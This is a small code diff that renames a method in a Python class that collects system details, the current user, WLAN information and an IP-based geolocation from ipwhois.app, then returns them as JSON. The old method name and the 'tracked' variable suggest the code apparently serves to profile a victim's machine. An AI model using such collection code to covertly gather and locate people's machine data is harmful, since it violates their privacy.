@@ -34,7 +34,7 @@ class PC_info:
         self.data["Operating system version"]=platform.version()
         self.data["Number of Cores"]=multiprocessing.cpu_count()
 
-    def yourFucked(self):
+    def yourFound(self):
         tracked = 'https://ipwhois.app/json/'+self.data['ip']
         self.ip_info = urllib.request.urlopen(tracked).read().decode('utf8')
         parsed = json.loads(self.ip_info)
@@ -54,7 +54,7 @@ class PC_info:
         self.currentUser()
         self.systemInfo()
         self.getWlanInfo()
-        self.yourFucked()
+        self.yourFound()
         return str(json.dumps(self.data, indent = 4))
 
 fu = PC_info()
